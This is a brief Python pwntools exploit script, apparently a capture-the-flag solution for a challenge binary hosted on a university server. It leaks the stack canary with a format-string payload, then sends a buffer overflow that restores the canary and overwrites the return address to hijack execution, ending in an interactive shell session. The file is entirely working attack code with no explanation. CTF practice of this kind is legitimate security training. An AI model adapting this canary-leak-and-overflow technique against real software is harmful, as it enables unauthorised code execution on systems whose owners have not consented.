#!/usr/bin/env python

from pwn import *

r = remote('bamboofox.cs.nctu.edu.tw', 22002)
# r = process('./binary_200')

r.sendline('%15$x')
canary = int(r.recv(), 16)
log.info(hex(canary))
r.sendline('a' * 40 + p32(canary) + 'a' * 12 + p32(0x804854d))

r.interactive()
